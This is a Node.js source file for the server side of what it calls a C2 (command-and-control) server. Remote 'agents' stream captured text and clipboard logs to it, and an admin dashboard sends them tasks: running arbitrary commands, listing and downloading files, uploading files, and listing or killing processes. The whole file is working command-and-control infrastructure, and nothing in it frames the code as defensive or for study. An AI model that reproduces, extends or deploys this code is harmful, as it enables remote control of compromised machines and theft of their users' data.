// src/sockets/index.js
// Wires up Socket.io namespaces: /agent (Python clients) and /admin (Dashboard).
// This is the real-time heart of the C2 server.

const prisma = require('../utils/prisma');
const { verifyToken } = require('../utils/jwt');
const logger = require('../utils/logger');

// Valid log types — mirrors the Prisma enum
const VALID_LOG_TYPES = new Set(['text', 'clipboard', 'system']);

/**
 * Authenticates a Socket connection using the X-Agent-API-Key handshake header.
 * Returns the Agent DB record on success, throws on failure.
 */
const authenticateAgent = async (socket) => {
  const apiKey =
    socket.handshake.headers['x-agent-api-key'] ||
    socket.handshake.auth?.api_key; // Allow auth object as fallback

  if (!apiKey) throw new Error('Missing API key');

  const agent = await prisma.agent.findUnique({ where: { api_key: apiKey } });
  if (!agent) throw new Error('Invalid API key');

  return agent;
};

/**
 * Authenticates a Socket connection using a JWT in the Authorization header or auth object.
 * Returns decoded JWT payload on success, throws on failure.
 */
const authenticateAdmin = (socket) => {
  const authHeader = socket.handshake.headers['authorization'];
  const tokenFromAuth = socket.handshake.auth?.token;

  const raw = authHeader?.startsWith('Bearer ') ? authHeader.split(' ')[1] : tokenFromAuth;

  if (!raw) throw new Error('Missing token');

  return verifyToken(raw); // throws JsonWebTokenError / TokenExpiredError
};

/**
 * Registers all Socket.io namespaces and their event handlers.
 * @param {import('socket.io').Server} io
 */
const registerSockets = (io) => {
  // ══════════════════════════════════════════════════════════════════════════
  // AGENT SOCKET REGISTRY
  // Maps agent_id → socket for active tasking command routing
  // ══════════════════════════════════════════════════════════════════════════
  const agentSockets = new Map();

  // ══════════════════════════════════════════════════════════════════════════
  // /agent NAMESPACE — Python Agent connections
  // ══════════════════════════════════════════════════════════════════════════
  const agentNs = io.of('/agent');

  agentNs.use(async (socket, next) => {
    try {
      const agent = await authenticateAgent(socket);
      socket.data.agent = agent; // Attach for use in event handlers
      next();
    } catch (err) {
      logger.warn('Agent socket auth rejected', {
        socketId: socket.id,
        reason: err.message,
        ip: socket.handshake.address,
      });
      next(new Error(`Authentication failed: ${err.message}`));
    }
  });

  agentNs.on('connection', async (socket) => {
    const agent = socket.data.agent;

    logger.info('Agent connected', {
      agentId: agent.id,
      hostname: agent.hostname,
      socketId: socket.id,
    });

    // ═══ Register agent socket for active tasking ══════════════════════════
    agentSockets.set(agent.id, socket);
    logger.debug('Agent socket registered for tasking', { agentId: agent.id });

    // Mark agent as online
    await prisma.agent.update({
      where: { id: agent.id },
      data: { status: 'online', last_seen: new Date() },
    });

    // Notify admin dashboard that this agent came online
    io.of('/admin').emit('agent_status', {
      agent_id: agent.id,
      hostname: agent.hostname,
      status: 'online',
      last_seen: new Date().toISOString(),
    });

    // ── new_log ─────────────────────────────────────────────────────────────
    // Primary data pipeline: agent emits a single log event.
    // 1. Validate  2. Persist async  3. Broadcast to /admin
    socket.on('new_log', async (data, ack) => {
      try {
        const { window_title, log_type, content, metadata, timestamp } = data || {};

        // Input validation
        if (!content || !VALID_LOG_TYPES.has(log_type)) {
          const errMsg = `Invalid log payload. 'content' is required and 'log_type' must be one of: ${[...VALID_LOG_TYPES].join(', ')}`;
          logger.warn('Agent sent invalid log', { agentId: agent.id, log_type, hasContent: !!content });
          if (typeof ack === 'function') ack({ ok: false, error: errMsg });
          return;
        }

        // ① Persist to Postgres (non-blocking — we don't await before broadcasting)
        const savePromise = prisma.log
          .create({
            data: {
              agent_id: agent.id,
              timestamp: timestamp ? new Date(timestamp) : new Date(),
              window_title: window_title || null,
              log_type,
              content,
              metadata: metadata || undefined,
            },
          })
          .then((saved) => {
            // Update agent heartbeat after successful save
            return prisma.agent.update({
              where: { id: agent.id },
              data: { last_seen: new Date() },
            });
          })
          .catch((err) => {
            logger.error('Failed to persist log', { agentId: agent.id, error: err.message });
          });

        // ② Broadcast to /admin immediately (before DB round-trip completes)
        const broadcastPayload = {
          agent_id: agent.id,
          agent_hostname: agent.hostname,
          window_title: window_title || null,
          log_type,
          content,
          metadata: metadata || null,
          timestamp: timestamp || new Date().toISOString(),
        };

        io.of('/admin').emit('new_log', broadcastPayload);

        // Acknowledge to the agent that we received it
        if (typeof ack === 'function') ack({ ok: true });

        // Await DB write (errors are caught inside the promise chain above)
        await savePromise;
      } catch (err) {
        logger.error('Error handling new_log event', { agentId: agent.id, error: err.message });
        if (typeof ack === 'function') ack({ ok: false, error: 'Server error' });
      }
    });

    // ── heartbeat ──────────────────────────────────────────────────────────
    socket.on('heartbeat', async () => {
      try {
        await prisma.agent.update({
          where: { id: agent.id },
          data: { last_seen: new Date() },
        });
      } catch (err) {
        logger.error('Heartbeat update failed', { agentId: agent.id, error: err.message });
      }
    });

    // ══════════════════════════════════════════════════════════════════════
    // ── task_result ────────────────────────────────────────────────────────
    // Active tasking: agent returns result of a command execution
    // Route this back to the /admin namespace
    // ══════════════════════════════════════════════════════════════════════
    socket.on('task_result', (data) => {
      try {
        const { task_id, result } = data || {};

        if (!task_id || !result) {
          logger.warn('Agent sent invalid task_result', { agentId: agent.id, hasTaskId: !!task_id, hasResult: !!result });
          return;
        }

        logger.info('Task result received from agent', {
          agentId: agent.id,
          taskId: task_id,
          success: result.success,
        });

        // Broadcast to all connected admin dashboards
        // (They filter by task_id client-side)
        io.of('/admin').emit('task_result', {
          agent_id: agent.id,
          task_id,
          result,
          timestamp: new Date().toISOString(),
        });

      } catch (err) {
        logger.error('Error handling task_result', { agentId: agent.id, error: err.message });
      }
    });

    // ── disconnect ─────────────────────────────────────────────────────────
    socket.on('disconnect', async (reason) => {
      logger.info('Agent disconnected', { agentId: agent.id, hostname: agent.hostname, reason });

      // ═══ Unregister from tasking map ════════════════════════════════════
      agentSockets.delete(agent.id);
      logger.debug('Agent socket unregistered from tasking', { agentId: agent.id });

      try {
        await prisma.agent.update({
          where: { id: agent.id },
          data: { status: 'offline' },
        });

        // Notify dashboard
        io.of('/admin').emit('agent_status', {
          agent_id: agent.id,
          hostname: agent.hostname,
          status: 'offline',
          last_seen: new Date().toISOString(),
        });
      } catch (err) {
        logger.error('Failed to set agent offline on disconnect', { error: err.message });
      }
    });
  });

  // ══════════════════════════════════════════════════════════════════════════
  // /admin NAMESPACE — Next.js Dashboard connections
  // ══════════════════════════════════════════════════════════════════════════
  const adminNs = io.of('/admin');

  adminNs.use((socket, next) => {
    try {
      const decoded = authenticateAdmin(socket);
      socket.data.admin = decoded;
      next();
    } catch (err) {
      logger.warn('Admin socket auth rejected', {
        socketId: socket.id,
        reason: err.message,
        ip: socket.handshake.address,
      });
      next(new Error(`Authentication failed: ${err.message}`));
    }
  });

  adminNs.on('connection', (socket) => {
    const admin = socket.data.admin;

    logger.info('Admin dashboard connected', {
      adminId: admin.id,
      email: admin.email,
      socketId: socket.id,
    });

    // Allow admin to subscribe to a specific agent's stream
    socket.on('subscribe_agent', (agentId) => {
      socket.join(`agent:${agentId}`);
      logger.debug('Admin subscribed to agent', { adminId: admin.id, agentId });
    });

    socket.on('unsubscribe_agent', (agentId) => {
      socket.leave(`agent:${agentId}`);
    });

    // ══════════════════════════════════════════════════════════════════════
    // ACTIVE TASKING COMMANDS
    // Admin sends commands → route to specific agent in /agent namespace
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Helper: Route a command to a specific agent
     */
    const routeToAgent = (agentId, eventName, payload) => {
      const agentSocket = agentSockets.get(agentId);

      if (!agentSocket || !agentSocket.connected) {
        logger.warn('Cannot route command: agent offline or not found', { agentId, eventName });
        // Send error back to admin
        socket.emit('task_error', {
          task_id: payload.task_id,
          error: 'Agent is offline or disconnected',
          agent_id: agentId,
        });
        return false;
      }

      logger.info('Routing task command to agent', {
        adminId: admin.id,
        agentId,
        eventName,
        taskId: payload.task_id,
      });

      agentSocket.emit(eventName, payload);
      return true;
    };

    // ── execute_command ────────────────────────────────────────────────────
    socket.on('execute_command', (data) => {
      const { agent_id, task_id, command } = data || {};

      if (!agent_id || !task_id || !command) {
        logger.warn('execute_command: missing required fields', { adminId: admin.id });
        socket.emit('task_error', { task_id, error: 'Missing agent_id, task_id, or command' });
        return;
      }

      routeToAgent(agent_id, 'execute_command', { task_id, command });
    });

    // ── list_directory ─────────────────────────────────────────────────────
    socket.on('list_directory', (data) => {
      const { agent_id, task_id, path } = data || {};

      if (!agent_id || !task_id || !path) {
        logger.warn('list_directory: missing required fields', { adminId: admin.id });
        socket.emit('task_error', { task_id, error: 'Missing agent_id, task_id, or path' });
        return;
      }

      routeToAgent(agent_id, 'list_directory', { task_id, path });
    });

    // ── download_file ──────────────────────────────────────────────────────
    socket.on('download_file', (data) => {
      const { agent_id, task_id, path } = data || {};

      if (!agent_id || !task_id || !path) {
        logger.warn('download_file: missing required fields', { adminId: admin.id });
        socket.emit('task_error', { task_id, error: 'Missing agent_id, task_id, or path' });
        return;
      }

      routeToAgent(agent_id, 'download_file', { task_id, path });
    });

    // ── upload_file ────────────────────────────────────────────────────────
    socket.on('upload_file', (data) => {
      const { agent_id, task_id, path, data: fileData } = data || {};

      if (!agent_id || !task_id || !path || !fileData) {
        logger.warn('upload_file: missing required fields', { adminId: admin.id });
        socket.emit('task_error', { task_id, error: 'Missing agent_id, task_id, path, or data' });
        return;
      }

      routeToAgent(agent_id, 'upload_file', { task_id, path, data: fileData });
    });

    // ── list_processes ─────────────────────────────────────────────────────
    socket.on('list_processes', (data) => {
      const { agent_id, task_id } = data || {};

      if (!agent_id || !task_id) {
        logger.warn('list_processes: missing required fields', { adminId: admin.id });
        socket.emit('task_error', { task_id, error: 'Missing agent_id or task_id' });
        return;
      }

      routeToAgent(agent_id, 'list_processes', { task_id });
    });

    // ── kill_process ───────────────────────────────────────────────────────
    socket.on('kill_process', (data) => {
      const { agent_id, task_id, pid, force } = data || {};

      if (!agent_id || !task_id || !pid) {
        logger.warn('kill_process: missing required fields', { adminId: admin.id });
        socket.emit('task_error', { task_id, error: 'Missing agent_id, task_id, or pid' });
        return;
      }

      routeToAgent(agent_id, 'kill_process', { task_id, pid, force: !!force });
    });

    socket.on('disconnect', (reason) => {
      logger.info('Admin dashboard disconnected', { adminId: admin.id, reason });
    });
  });

  logger.info('Socket.io namespaces registered: /agent, /admin');
};

module.exports = registerSockets;
